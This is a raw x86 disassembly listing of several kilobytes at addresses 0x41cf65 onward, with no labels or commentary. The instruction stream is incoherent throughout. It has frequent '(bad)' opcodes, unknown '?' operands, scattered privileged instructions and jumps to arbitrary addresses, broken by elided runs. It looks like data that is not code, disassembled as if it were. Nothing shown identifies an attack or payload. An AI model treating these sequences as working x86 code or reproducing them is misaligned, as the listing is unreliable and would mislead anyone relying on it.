  41cf65:	xor    BYTE PTR [eax-0x7637db0b],cl
  41cf6b:	lods   al,BYTE PTR ds:[esi]
  41cf6c:	fild   WORD PTR [edi+ebx*8-0x13]
  41cf70:	jmp    0x51f57b1
  41cf75:	jge    0x41cfc2
  41cf77:	leave  
  41cf78:	int    0x47
  41cf7a:	ror    al,0x3
  41cf7d:	jp     0x41cfd0
  41cf7f:	(bad)  
  41cf80:	jmp    0x7ff2d0bf
  41cf85:	shl    DWORD PTR [eax+ebp*8],0x70
  41cf89:	dec    eax
  41cf8a:	add    dh,BYTE PTR [eax-0x56]
  41cf8d:	and    al,BYTE PTR [edi+0x5b86242c]
  41cf93:	cdq    
  41cf94:	rol    BYTE PTR [ebp+0x7b],1
  41cf97:	sub    bh,BYTE PTR [ecx-0x2e]
  41cf9a:	fbstp  TBYTE PTR [edx-0x46]
  41cf9d:	add    DWORD PTR ss:[eax+0x62d3d26e],edi
  41cfa4:	ret    0x874a
  41cfa7:	sbb    al,0xd0
  41cfa9:	sbb    ebx,DWORD PTR [edx]
  41cfab:	jb     0x41cfad
	...
  41cfc5:	mov    edx,0x70dce936
  41cfca:	stos   BYTE PTR es:[edi],al
  41cfcb:	rep outs dx,BYTE PTR ds:[esi]
  41cfcd:	arpl   WORD PTR [edx],dx
  41cfcf:	mov    DWORD PTR [edi+edx*8+0x71f1737b],edi
  41cfd6:	retf   0xea17
  41cfd9:	es jge 0x41cff8
  41cfdc:	sbb    esi,DWORD PTR [edi]
  41cfde:	in     eax,dx
  41cfdf:	dec    edx
  41cfe0:	add    BYTE PTR [ecx],cl
  41cfe2:	jbe    0x41cfc7
  41cfe4:	mov    edx,DWORD PTR [eax+0x1945fb12]
  41cfea:	add    ecx,DWORD PTR [ecx-0x20]
  41cfed:	(bad)  
  41cfee:	inc    esi
  41cfef:	icebp  
  41cff0:	cmp    eax,DWORD PTR [eax-0x1d2f842e]
  41cff6:	outs   dx,BYTE PTR ds:[esi]
  41cff7:	cmc    
  41cff8:	mov    edx,DWORD PTR [eax+0x54d3512]
  41cffe:	std    
  41cfff:	mov    ebx,DWORD PTR [esi+0x33faecf3]
  41d005:	inc    DWORD PTR [edx]
  41d007:	dec    ecx
  41d008:	fmul   QWORD PTR [edi+eax*2]
  41d00b:	jmp    0x11b11650
  41d010:	jno    0x2341cb8c
  41d016:	jp     0x41d059
  41d018:	or     al,0x97
  41d01a:	cmp    edx,ebp
  41d01c:	mov    ch,dl
  41d01e:	jp     0x41cfe3
  41d020:	pop    edi
  41d021:	adc    ecx,DWORD PTR [edx-0x3a]
  41d024:	ret    0x1d5
  41d027:	das    
  41d028:	rol    BYTE PTR [eax],0x0
	...
  41d03f:	add    BYTE PTR [eax],al
  41d041:	add    BYTE PTR [esi-0x6e74af0d],dh
  41d047:	sub    esp,0x53c4648
  41d04d:	mov    eax,DWORD PTR [ecx*1+0x3c545756]
  41d054:	in     eax,dx
  41d055:	mov    edx,DWORD PTR [eax]
  41d057:	adc    eax,0x5426fa87
  41d05c:	or     eax,0xfa016503
  41d061:	xor    ebx,DWORD PTR [ebx]
  41d063:	out    dx,eax
  41d064:	inc    eax
  41d065:	std    
  41d066:	popf   
  41d067:	out    dx,eax
  41d068:	inc    eax
  41d069:	(bad)  
  41d06a:	popf   
  41d06b:	or     BYTE PTR [ecx-0x48],0x4
  41d06f:	ins    BYTE PTR es:[edi],dx
  41d070:	mov    ebp,0x2960f489
  41d075:	cmp    DWORD PTR ds:0xf5ba884e,esi
  41d07b:	sbb    eax,DWORD PTR [ecx]
  41d07d:	sub    DWORD PTR [edx+ecx*4],ebp
  41d080:	mov    WORD PTR [ebx+0x28],cs
  41d083:	ret    0x8900
  41d086:	test   eax,0x34438a4b
  41d08b:	mov    ah,0xce
  41d08d:	jmp    0x41d08e
  41d08f:	jmp    0x41d095
  41d091:	mov    ebp,DWORD PTR [eax+0x1c]
  41d094:	add    DWORD PTR [eax],eax
  41d096:	(bad)  
  41d098:	mov    al,BYTE PTR [ebx+0x44]
  41d09b:	adc    al,BYTE PTR [ecx]
  41d09d:	mov    DWORD PTR [ecx-0x42f055f5],edi
  41d0a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0a4:	(bad)  
  41d0a5:	repz add BYTE PTR [eax],al
	...
  41d0bc:	add    BYTE PTR [eax],al
  41d0be:	add    BYTE PTR [ebp-0x70],bh
  41d0c1:	push   ebp
  41d0c2:	cmp    DWORD PTR ds:0xb98700a8,esi
  41d0c8:	push   edi
  41d0c9:	mov    al,BYTE PTR [ebx+0x28]
  41d0cc:	adc    al,BYTE PTR [ebx+0x7b]
  41d0cf:	mul    DWORD PTR [edi+edi*4+0x57e17fdb]
  41d0d6:	or     eax,0xd2bd9ab
  41d0db:	mov    ds:0x51892809,eax
  41d0e0:	es sar ah,cl
  41d0e3:	inc    ecx
  41d0e4:	mov    dh,BYTE PTR [esi]
  41d0e6:	jae    0x41d0ac
  41d0e8:	xchg   esi,eax
  41d0e9:	inc    eax
  41d0ea:	cld    
  41d0eb:	mov    ebx,0x51ad0693
  41d0f0:	xchg   edx,eax
  41d0f1:	mov    cl,BYTE PTR [ebx-0x8]
  41d0f4:	mov    dh,0xbf
  41d0f6:	out    dx,eax
  41d0f7:	ja     0x41d0fa
  41d0f9:	and    BYTE PTR [eax],al
  41d0fb:	ja     0x41d0f6
  41d0fd:	and    eax,DWORD PTR [eax]
  41d0ff:	sbb    DWORD PTR [edx+0x3],0xee05b246
  41d106:	add    edi,DWORD PTR [ebx-0x4e]
  41d109:	call   0x3bc0:0x604d1f8c
  41d110:	inc    ebx
  41d111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d112:	ss hlt 
  41d114:	inc    edx
  41d115:	lods   al,BYTE PTR ds:[esi]
  41d116:	push   cs
  41d117:	hlt    
  41d118:	inc    edx
  41d119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d11a:	dec    edi
  41d11b:	pop    ebx
  41d11c:	inc    edx
  41d11d:	lods   al,BYTE PTR ds:[esi]
  41d11e:	aaa    
  41d11f:	push   ebx
  41d120:	adc    DWORD PTR [edx],0xb5
	...
  41d13a:	add    BYTE PTR [eax],al
  41d13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d13d:	xchg   DWORD PTR [edi+ebx*1-0x761c4e0c],esp
  41d144:	in     al,0x7c
  41d146:	mov    esp,0xd1057e36
  41d14b:	shr    BYTE PTR [eax],0xb2
  41d14e:	jmp    0x41d186
  41d150:	mov    bh,0x20
  41d152:	adc    dl,BYTE PTR [eax]
  41d154:	jne    0x41d100
  41d156:	push   es
  41d157:	add    eax,DWORD PTR [edi+0xfc02503]
  41d15d:	add    eax,0xeee8bf6f
  41d162:	and    ecx,DWORD PTR ds:0xbfd61187
  41d168:	sar    DWORD PTR [edi+0x24],cl
  41d16b:	dec    esp
  41d16c:	jmp    0x7506702a
  41d171:	test   eax,0xc173049e
  41d176:	sahf   
  41d177:	mov    ch,0xb7
  41d179:	pop    ds
  41d17a:	jecxz  0x41d1b9
  41d17c:	aaa    
  41d17d:	push   ecx
  41d17e:	out    0x88,eax
  41d180:	aaa    
  41d181:	and    edx,esp
  41d183:	mov    esi,0x89deb29b
  41d188:	aaa    
  41d189:	sub    al,0x61
  41d18b:	iret   
  41d18c:	add    BYTE PTR [eax],ah
  41d18e:	in     eax,dx
  41d18f:	mov    DWORD PTR [edi],esi
  41d191:	adc    al,0x71
  41d193:	iret   
  41d194:	cwde   
  41d195:	test   BYTE PTR [eax],al
  41d197:	hlt    
  41d198:	retf   0x8804
  41d19b:	adc    al,0xf9
  41d19d:	mov    al,0x2
  41d19f:	and    eax,DWORD PTR [eax]
	...
  41d1b9:	inc    ebx
  41d1ba:	inc    edi
  41d1bb:	je     0x41d1ac
  41d1bd:	ja     0x41d1b8
  41d1bf:	add    DWORD PTR [ecx-0xc],esp
  41d1c2:	cli    
  41d1c3:	lds    esp,FWORD PTR [edx+eiz*1+0x23ac852c]
  41d1ca:	ret    
  41d1cb:	jg     0x41d189
  41d1cd:	and    eax,DWORD PTR ds:0x4d26c0d
  41d1d3:	add    cl,ch
  41d1d5:	ja     0x41d1d0
  41d1d7:	pop    es
  41d1d8:	imul   ecx,DWORD PTR [ebx+0x39730057],0x6b691cb7
  41d1e2:	sub    DWORD PTR [eax],eax
  41d1e4:	arpl   WORD PTR [ebx],di
  41d1e6:	adc    BYTE PTR [esp+ebp*8+0x1d],dh
  41d1ea:	(bad)  
  41d1eb:	clc    
  41d1ec:	jne    0x41d1ec
  41d1ee:	clc    
  41d1ef:	add    esp,DWORD PTR [ecx+0x11]
  41d1f2:	adc    DWORD PTR [edi+ebx*8],0xffffffc9
  41d1f6:	(bad)  
  41d1f7:	std    
  41d1f8:	call   0x283aa96c
  41d1fd:	int    0xfc
  41d1ff:	or     edi,ecx
  41d201:	xor    esi,eax
  41d203:	std    
  41d204:	jmp    0x3d3ed288
  41d209:	inc    esp
  41d20a:	jle    0x41d210
  41d20c:	out    dx,eax
  41d20d:	and    BYTE PTR [esi+0x4ea2b6c3],dh
  41d213:	std    
  41d214:	xor    al,0x4
  41d216:	aad    0xfc
  41d218:	sbb    al,0x8
  41d21a:	sbb    eax,0x9dae
	...
  41d237:	sub    BYTE PTR [ecx],al
  41d239:	cdq    
  41d23a:	xor    al,BYTE PTR [ebp+0x73]
  41d23d:	xlat   BYTE PTR ds:[ebx]
  41d23e:	loopne 0x41d1f5
  41d240:	fild   DWORD PTR [eax]
  41d242:	stos   BYTE PTR es:[edi],al
  41d243:	cdq    
  41d244:	dec    eax
  41d245:	call   0x10332d64
  41d24a:	sar    BYTE PTR [edx],cl
  41d24c:	jmp    0x87385350
  41d251:	jne    0x41d2ac
  41d253:	call   0x7347d35a
  41d258:	add    eax,0x87f3a088
  41d25d:	inc    ebp
  41d25e:	mov    ebx,0xbafb9bdd
  41d263:	lock xchg BYTE PTR [ebp+0x49],al
  41d267:	push   ebp
  41d268:	cld    
  41d269:	jne    0x41d278
  41d26b:	add    eax,0x2bb550c6
  41d270:	push   cs
  41d271:	add    DWORD PTR [ebp+0x5],ecx
  41d274:	out    dx,eax
  41d275:	adc    DWORD PTR [eax+0x608b0fe2],0xffffffe2
  41d27c:	jle    0x41d2eb
  41d27e:	in     eax,dx
  41d27f:	adc    eax,0xcd4537
  41d284:	mov    WORD PTR [ebx+0x1b],?
  41d287:	idiv   dl
  41d289:	and    DWORD PTR [eax-0x22],0xf
  41d28d:	mov    edx,DWORD PTR [eax-0x22]
  41d290:	jle    0x41d2ff
  41d292:	dec    ecx
  41d293:	adc    DWORD PTR [edi],esi
  41d295:	inc    ebp
  41d296:	push   ebp
  41d297:	push   es
  41d298:	mov    WORD PTR [edi+0x0],cs
	...
  41d2b3:	retf   
  41d2b4:	cmc    
  41d2b5:	cli    
  41d2b6:	pop    ebx
  41d2b7:	sbb    ch,BYTE PTR [edx-0x3d5ba13b]
  41d2bd:	sldt   WORD PTR [eax]
  41d2c0:	stos   BYTE PTR es:[edi],al
  41d2c1:	jmp    0x41d246
  41d2c3:	mov    ecx,0xe2565024
  41d2c8:	xor    edi,ecx
  41d2ca:	xor    ebx,DWORD PTR [edx+0x44c0303d]
  41d2d0:	dec    esp
  41d2d1:	jmp    0x382ac75f
  41d2d6:	xchg   DWORD PTR [ecx+0x58],eax
  41d2d9:	jnp    0x41d356
  41d2db:	mov    WORD PTR [eax+ebx*8+0x13],es
  41d2df:	jmp    0x41d27a
  41d2e1:	push   0x7e1b93ff
  41d2e6:	dec    ebx
  41d2e7:	cld    
  41d2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2e9:	(bad)  
  41d2ea:	fild   QWORD PTR [ebp+0x70]
  41d2ed:	xor    DWORD PTR [ecx+0x537c2c29],ecx
  41d2f3:	jo     0x41d30b
  41d2f5:	ds or  eax,0x4397a
  41d2fb:	hlt    
  41d2fc:	mov    dh,0xbe
  41d2fe:	sti    
  41d2ff:	outs   dx,DWORD PTR ds:[esi]
  41d300:	nop
  41d301:	xor    DWORD PTR [ecx],eax
  41d303:	cmp    eax,0xfbd7bea4
  41d308:	mov    dl,0xff
  41d30a:	or     edx,ebx
  41d30c:	rcl    BYTE PTR es:[edi],0xeb
  41d310:	lahf   
  41d311:	xlat   BYTE PTR ds:[ebx]
  41d312:	(bad)  
  41d313:	xor    ebx,DWORD PTR [ebx]
  41d315:	jle    0x41d2ee
	...
  41d32f:	add    BYTE PTR [ebp+0x58],bh
  41d332:	push   ebp
  41d333:	mov    eax,esp
  41d335:	add    cl,BYTE PTR [ecx+0x43]
  41d338:	adc    BYTE PTR [ecx+eax*1],bl
  41d33b:	add    ah,dh
  41d33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d33e:	xor    edi,DWORD PTR [ecx]
  41d340:	mov    cl,0x4f
  41d342:	mov    al,0x5e
  41d344:	outs   dx,DWORD PTR ds:[esi]
  41d345:	lock xor eax,DWORD PTR [edi+0x4b7e23a9]
  41d34c:	int3   
  41d34d:	mov    ds:0x1552f7af,eax
  41d352:	adc    BYTE PTR ds:0x7b7cf269,cl
  41d358:	fdiv   DWORD PTR [ebx+0x4e413941]
  41d35e:	mov    al,0xc
  41d360:	jg     0x41d36b
  41d362:	sub    al,0x66
  41d364:	std    
  41d365:	add    al,0x3
  41d367:	lods   eax,DWORD PTR ds:[esi]
  41d368:	inc    esi
  41d369:	jmp    DWORD PTR ds:0x13152eef
  41d36f:	xor    eax,0xb896ec39
  41d374:	stc    
  41d375:	jge    0x41d37b
  41d377:	and    BYTE PTR [ebx-0x56],dh
  41d37a:	jb     0x41d36a
  41d37c:	push   cs
  41d37d:	xor    esp,esi
  41d37f:	push   es
  41d380:	jae    0x41d32c
  41d382:	jb     0x41d30a
  41d384:	jmp    DWORD PTR [eax]
  41d386:	out    0xb1,eax
  41d388:	repz jmp 0x41d366
  41d38b:	pop    ds
  41d38c:	lock add ebp,DWORD PTR [ecx-0x3b7c0fe2]
  41d393:	daa    
	...
  41d3ac:	add    ah,dh
  41d3ae:	jnp    0x41d364
  41d3b0:	adc    esi,ebp
  41d3b2:	cmp    eax,0xbf4bc0e8
  41d3b7:	icebp  
  41d3b8:	mov    eax,0x7e7ea8e7
  41d3bd:	mov    edi,0x4fc0721c
  41d3c2:	fsubr  QWORD PTR [ebx-0x57ab22d1]
  41d3c8:	lds    esi,FWORD PTR [edx-0x2e]
  41d3cb:	(bad)  
  41d3cc:	jge    0x41d395
  41d3ce:	xor    dl,dl
  41d3d0:	fcomp  DWORD PTR [edi]
  41d3d2:	jl     0x41d370
  41d3d4:	sbb    ebx,ebp
  41d3d6:	xor    al,0xe6
  41d3d8:	bound  esp,QWORD PTR [ebx]
  41d3da:	ret    
  41d3db:	pop    edi
  41d3dc:	mov    eax,0x3695f82b
  41d3e1:	mov    ebp,0x7cfc5d46
  41d3e6:	leave  
  41d3e7:	mov    esi,0xc2213f7b
  41d3ec:	or     ch,BYTE PTR [ebp-0x37]
  41d3ef:	sahf   
  41d3f0:	jnp    0x41d439
  41d3f2:	and    DWORD PTR [edi-0x51],esp
  41d3f5:	out    dx,eax
  41d3f6:	add    al,0x0
  41d3f8:	fs mov ch,0x5
  41d3fb:	jae    0x41d3e7
  41d3fd:	inc    edx
  41d3fe:	mov    edx,0xf7a37203
  41d403:	or     al,0x4e
  41d405:	retf   
  41d406:	adc    eax,DWORD PTR [ecx]
  41d408:	mov    ebx,0x5e0d3d99
  41d40d:	cmp    BYTE PTR ds:0xe900,al
	...
  41d427:	add    BYTE PTR [eax],al
  41d429:	add    ah,ah
  41d42b:	ret    
  41d42c:	fld    TBYTE PTR [ecx+0x63]
  41d42f:	or     eax,DWORD PTR [eax]
  41d431:	bound  eax,QWORD PTR [ebx-0x5]
  41d434:	jb     0x41d412
  41d436:	add    BYTE PTR [ebx+edx*8-0x780e0b8f],bh
  41d43d:	int    0x6c
  41d43f:	sub    BYTE PTR es:[esi],0xf2
  41d443:	jp     0x41d490
  41d445:	dec    ebp
  41d446:	mov    eax,0x1ff30447
  41d44b:	jge    0x41d459
  41d44d:	not    cl
  41d44f:	mov    ebx,0x450f37e3
  41d454:	(bad)  
  41d456:	ret    0xfcd5
  41d459:	repz stc 
  41d45b:	add    eax,0xf03471d8
  41d460:	(bad)  
  41d461:	imul   edi,DWORD PTR [ebp-0x7378fe],0x9f01437f
  41d46b:	retf   
  41d46c:	rol    edx,cl
  41d46e:	mov    eax,0x236242ab
  41d473:	and    ecx,DWORD PTR [ecx-0x30fa2c64]
  41d479:	jo     0x41d49d
  41d47b:	dec    edi
  41d47c:	mov    DWORD PTR [eax+ebx*1],esi
  41d47f:	jle    0x41d4d4
  41d481:	int    0x8
  41d483:	or     DWORD PTR [ecx+0x151c241c],ecx
  41d489:	add    BYTE PTR [esi+0x57],cl
  41d48c:	cmc    
  41d48d:	inc    DWORD PTR [eax]
	...
  41d4a7:	or     DWORD PTR [ebx],ecx
  41d4a9:	xchg   DWORD PTR [ebp-0x47],edx
  41d4ac:	pop    esp
  41d4ad:	mov    BYTE PTR [ebp-0x5b],dh
  41d4b0:	test   eax,0xd3ce0858
  41d4b5:	gs mov ecx,ecx
  41d4b8:	push   ecx
  41d4b9:	ds cmp edx,eax
  41d4bc:	mov    eax,0x6716e47b
  41d4c1:	or     eax,0xfcd8c8ff
  41d4c6:	dec    esp
  41d4c7:	jns    0x41d472
  41d4c9:	dec    eax
  41d4ca:	clc    
  41d4cb:	inc    esi
  41d4cc:	sar    DWORD PTR [si+0x63],1
  41d4d0:	cmc    
  41d4d1:	inc    eax
  41d4d2:	cld    
  41d4d3:	push   es
  41d4d4:	addr16 or eax,0xad6a039
  41d4da:	mov    ecx,ds
  41d4dc:	repz cli 
  41d4de:	(bad)  
  41d4df:	dec    dh
  41d4e1:	cld    
  41d4e2:	dec    esp
  41d4e3:	lods   eax,DWORD PTR ds:[esi]
  41d4e4:	add    ch,al
  41d4e6:	add    DWORD PTR [eax-0x67c4c00e],esp
  41d4ec:	push   cs
  41d4ed:	or     ecx,DWORD PTR [edi+ebp*1-0x3900050c]
  41d4f4:	or     DWORD PTR ds:[edx+0x887b660],ecx
  41d4fb:	xchg   esi,eax
  41d4fc:	mov    esp,0xeb665e5a
  41d501:	rcr    DWORD PTR [eax],0xd
  41d504:	xor    DWORD PTR [ebp-0x77aff715],edi
  41d50a:	in     al,dx
	...
  41d523:	add    BYTE PTR [esi+0x608b5005],bl
  41d529:	sub    cl,BYTE PTR [eax+0x544ef149]
  41d52f:	mov    DWORD PTR [eax],esp
  41d531:	in     eax,dx
  41d532:	xchg   BYTE PTR [ebp-0xc],cl
  41d535:	daa    
  41d536:	jp     0x41d532
  41d538:	outs   dx,DWORD PTR ds:[esi]
  41d539:	lock adc eax,DWORD PTR [ecx]
  41d53c:	lods   al,BYTE PTR ds:[esi]
  41d53d:	sbb    ah,BYTE PTR [edi]
  41d53f:	xor    edx,ecx
  41d541:	pop    ebp
  41d542:	(bad)  
  41d543:	std    
  41d544:	hlt    
  41d545:	push   ebp
  41d546:	(bad)  
  41d547:	cld    
  41d548:	hlt    
  41d549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d54a:	mov    esi,0x6fe06daf
  41d54f:	xchg   DWORD PTR [ecx],edi
  41d551:	js     0x41d53c
  41d553:	mov    esi,0xff24a0fb
  41d558:	mov    ds:0x47c7da1b,eax
  41d55d:	mov    ch,0xbe
  41d55f:	(bad)  
  41d560:	lahf   
  41d561:	sbb    bh,BYTE PTR [edx+0x53]
  41d564:	in     al,0xa2
  41d566:	(bad)  
  41d567:	mov    ebx,0x3934106d
  41d56c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d56d:	xor    BYTE PTR cs:[edi+0x29011bf5],0x36
  41d575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d576:	(bad)  
  41d577:	retf   
  41d578:	dec    edi
  41d579:	sbb    bh,BYTE PTR [edx+0x43]
  41d57c:	sub    BYTE PTR [ecx+0x11],dl
  41d57f:	push   edi
  41d580:	jge    0x41d5da
  41d582:	sub    DWORD PTR [edi-0x4116ec47],eax
	...
  41d5a0:	add    cl,al
  41d5a2:	sbb    bh,BYTE PTR [ebx+eax*2+0x3c]
  41d5a6:	mov    dl,0xc6
  41d5a8:	(bad)  
  41d5a9:	out    dx,eax
  41d5aa:	fsubr  QWORD PTR [esi+0x49587d00]
  41d5b0:	mov    ecx,eax
  41d5b2:	repz cld 
  41d5b4:	mov    ah,0xa9
  41d5b6:	paddw  mm6,QWORD PTR [ecx+ebp*4-0x38485d5]
  41d5be:	mov    ch,BYTE PTR [esi]
  41d5c0:	jae    0x41d5be
  41d5c2:	adc    eax,0x40cf3b8
  41d5c7:	shr    DWORD PTR [ebx],1
  41d5c9:	icebp  
  41d5ca:	and    al,0xee
  41d5cc:	pop    esi
  41d5cd:	dec    edi
  41d5ce:	sbb    eax,0x8fefc062
  41d5d3:	and    al,0x38
  41d5d5:	jne    0x41d581
  41d5d7:	mov    ds:0xc6aa7503,al
  41d5dc:	add    esi,DWORD PTR [ebp-0x56]
  41d5df:	mov    esi,0xc2aa7503
  41d5e4:	add    ebp,DWORD PTR [edi-0x1f]
  41d5e7:	hlt    
  41d5e8:	lds    edi,FWORD PTR [ecx+0x277ce70c]
  41d5ee:	pop    ecx
  41d5ef:	pusha  
  41d5f0:	rol    bh,1
  41d5f2:	mov    fs,WORD PTR [eax+ecx*2]
  41d5f5:	mov    dl,0xca
  41d5f7:	xchg   esi,eax
  41d5f8:	add    al,0xba
  41d5fa:	retf   0x4d5
  41d5fd:	ja     0x41d63f
  41d5ff:	cmc    
  41d600:	iret   
  41d601:	je     0x41d5a5
  41d603:	jle    0x41d608
	...
  41d61d:	add    BYTE PTR [edi],al
  41d61f:	or     esi,esi
  41d621:	jbe    0x41d627
  41d623:	mov    ?,WORD PTR [edi+ecx*2-0x5a18a407]
  41d62a:	sbb    al,0xca
  41d62c:	sub    bh,BYTE PTR [eax+0x1bac23f6]
  41d632:	pop    ebp
  41d633:	std    
  41d634:	imul   esi,DWORD PTR [eax-0x343faa9],0xc825356c
  41d63e:	loopne 0x41d644
  41d640:	jo     0x41d61a
  41d642:	push   ebx
  41d643:	stos   DWORD PTR es:[edi],eax
  41d644:	loope  0x41d60e
  41d646:	dec    ebx
  41d647:	call   0xc862:0x28b72efd
  41d64e:	aaa    
  41d64f:	and    al,0xb4
  41d651:	push   edi
  41d652:	jne    0x41d699
  41d654:	jmp    0x7a65db
  41d659:	jmp    0x6f059dde
  41d65e:	mov    ebp,DWORD PTR ds:0x53bbaf04
  41d664:	add    BYTE PTR [edx-0x4d],dh
  41d667:	sub    edi,DWORD PTR [ecx]
  41d669:	sub    al,0xc
  41d66b:	fwait
  41d66c:	or     esi,ebx
  41d66e:	pusha  
  41d66f:	enter  0xf6db,0x48
  41d673:	mov    eax,0x10c8d2df
  41d678:	mov    ch,0x2c
  41d67a:	sbb    BYTE PTR [edx],dl
  41d67c:	mov    ch,0x14
  41d67e:	and    al,0x85
  41d680:	jnp    0x41d629
	...
  41d69a:	add    al,bh
  41d69c:	mov    edx,DWORD PTR [ebx-0x43]
  41d69f:	ins    BYTE PTR es:[edi],dx
  41d6a0:	or     DWORD PTR [esi-0x2e],esp
  41d6a3:	mov    edx,0x77f37463
  41d6a8:	adc    DWORD PTR [edx],eax
  41d6aa:	jno    0x41d6a8
  41d6ac:	adc    cl,BYTE PTR ds:0xe8642036
  41d6b2:	loope  0x41d6b3
  41d6b4:	enter  0xe80d,0x31
  41d6b8:	enter  0xe8fd,0xee
  41d6bc:	mov    bh,0xbf
  41d6be:	push   0xffffffb2
  41d6c0:	push   es
  41d6c1:	adc    ah,0x8
  41d6c4:	add    eax,0x46e640d
  41d6c9:	add    cl,ch
  41d6cb:	ja     0x41d6de
  41d6cd:	or     BYTE PTR [ecx-0x65],ch
  41d6d0:	push   ebx
  41d6d1:	add    BYTE PTR [ebx-0x7],ah
  41d6d4:	cwde   
  41d6d5:	imul   ecx,DWORD PTR cs:[ebx+0x2d9d0020],0xbbb488a9
  41d6e0:	stos   BYTE PTR es:[edi],al
  41d6e1:	cmp    BYTE PTR [edi+ecx*4-0x5f21d968],bh
  41d6e8:	mov    bh,0xdb
  41d6ea:	add    BYTE PTR [ecx],cl
  41d6ec:	or     ecx,DWORD PTR [eax-0x26b479f9]
  41d6f2:	mov    BYTE PTR [ecx],dl
  41d6f4:	and    DWORD PTR [esi+0x439f15e8],edi
  41d6fa:	push   cs
  41d6fb:	fmul   st(0),st
  41d6fd:	inc    eax
  41d6fe:	inc    DWORD PTR [eax]
	...
  41d718:	fcomp  QWORD PTR [edi-0x37b147b0]
  41d71e:	add    ebx,ebp
  41d720:	aad    0x22
  41d722:	or     eax,0xfff020c6
  41d727:	xchg   edx,edx
  41d729:	icebp  
  41d72a:	jo     0x41d6fc
  41d72c:	pop    eax
  41d72d:	or     cl,BYTE PTR [esi]
  41d72f:	inc    DWORD PTR [eax]
  41d731:	leave  
  41d732:	cli    
  41d733:	jne    0x41d6ea
  41d735:	icebp  
  41d736:	jo     0x41d730
  41d738:	in     eax,dx
  41d739:	out    dx,eax
  41d73a:	jo     0x41d730
  41d73c:	jne    0x41d7a7
  41d73e:	stc    
  41d73f:	jmp    FWORD PTR [edx+0x5]
  41d742:	lock test DWORD PTR [ebp+0x5b],ebx
  41d746:	xor    eax,0xace80ff
  41d74b:	mov    bh,0xd8
  41d74d:	in     al,0xfa
  41d74f:	jne    0x41d756
  41d751:	and    DWORD PTR [ebp+edx*2-0xb8f0f33],esi
  41d758:	out    0x5a,al
  41d75a:	mov    cl,0xc6
  41d75c:	push   edx
  41d75d:	pop    es
  41d75e:	xchg   DWORD PTR [ebp+0x55],edi
  41d761:	sahf   
  41d762:	inc    eax
  41d763:	inc    ch
  41d765:	dec    edx
  41d766:	cld    
  41d767:	call   0x3cb00f
  41d76c:	(bad)  
  41d76d:	dec    edx
  41d76e:	or     DWORD PTR [ebx],eax
  41d770:	out    0x34,al
  41d772:	cld    
  41d773:	jne    0x41d786
  41d775:	add    eax,0x140550c6
  41d77a:	or     al,BYTE PTR [ecx]
	...
  41d794:	add    ah,dh
  41d796:	sub    eax,DWORD PTR [eax]
  41d798:	icebp  
  41d799:	ja     0x41d804
  41d79b:	xor    DWORD PTR [eax],edx
  41d79d:	jg     0x41d810
  41d79f:	xor    DWORD PTR [ecx+0x3910ef99],eax
  41d7a5:	mov    ecx,0xaa8bfbd7
  41d7aa:	xor    DWORD PTR [ecx],ebp
  41d7ac:	std    
  41d7ad:	ja     0x41d79f
  41d7af:	pop    ss
  41d7b0:	adc    BYTE PTR [edi-0x18],bh
  41d7b3:	pop    ss
  41d7b4:	adc    DWORD PTR [ecx+0x64],0x7c313914
  41d7bb:	stc    
  41d7bc:	mov    edx,DWORD PTR [esi]
  41d7be:	dec    edx
  41d7bf:	sub    ebp,edi
  41d7c1:	das    
  41d7c2:	add    edi,DWORD PTR [ebp-0x3a]
  41d7c5:	and    ah,BYTE PTR [ebp+0x46]
  41d7c8:	adc    ah,dh
  41d7ca:	clc    
  41d7cb:	jl     0x41d7b9
  41d7cd:	ja     0x41d846
  41d7cf:	fcom   DWORD PTR [eax+0x42]
  41d7d2:	fcomi  st,st(4)
  41d7d4:	shl    edi,1
  41d7d6:	jp     0x41d799
  41d7d8:	xor    BYTE PTR [esp+eiz*4+0x7defce],dh
  41d7df:	xor    BYTE PTR [edi+0x7b7b8021],al
  41d7e5:	nop
  41d7e6:	push   esp
  41d7e7:	rcl    BYTE PTR [ebx],1
  41d7e9:	jmp    0x41d7ac
  41d7eb:	pop    ebp
  41d7ec:	push   DWORD PTR [ebx+0x2b]
  41d7ef:	jle    0x41d83c
  41d7f1:	cld    
  41d7f2:	xchg   esp,eax
  41d7f3:	into   
  41d7f4:	jecxz  0x41d863
  41d7f6:	push   0x8921
	...
  41d80f:	add    BYTE PTR [eax],al
  41d811:	add    BYTE PTR [ecx+0x50537c1b],ch
  41d817:	push   es
  41d818:	ds or  eax,0x2ab7a
  41d81e:	hlt    
  41d81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d820:	mov    dh,0xfb
  41d822:	outs   dx,DWORD PTR ds:[esi]
  41d823:	nop
  41d824:	and    DWORD PTR [edi+0x7ce90415],edi
  41d82a:	mov    edi,0xecf8723c
  41d82f:	frstor [ebx-0x497716f5]
  41d835:	add    al,0xf4
  41d837:	add    al,0x70
  41d839:	mov    ecx,0x2a978f03
  41d83e:	cmp    edi,eax
  41d840:	inc    BYTE PTR [esp+esi*8]
  41d843:	add    al,0xe7
  41d845:	jle    0x41d82b
  41d847:	fsubr  QWORD PTR [ebx]
  41d849:	adc    BYTE PTR [edi-0x42],ch
  41d84c:	jno    0x41d806
  41d84e:	retf   
  41d84f:	mov    WORD PTR [esp+ebp*1+0x23],ss
  41d853:	loope  0x41d836
  41d855:	mov    al,0x3c
  41d857:	mov    WORD PTR [eax+ebp*1+0x7d],es
  41d85b:	push   eax
  41d85c:	add    bh,BYTE PTR [ecx+0x7ee4a1f3]
  41d862:	das    
  41d863:	sbb    eax,0x9a6cf7f0
  41d868:	in     al,dx
  41d869:	ret    0xa1ec
  41d86c:	mul    BYTE PTR [edi+0x33d1d0a5]
  41d872:	daa    
  41d873:	pop    es
  41d874:	pusha  
  41d875:	test   al,0x0
	...
  41d88f:	mov    ds:0xcd30048e,eax
  41d894:	mov    eax,ds:0x8df4a872
  41d899:	hlt    
  41d89a:	das    
  41d89b:	jne    0x41d83f
  41d89d:	jle    0x41d8a2
  41d89f:	repnz or al,0x22
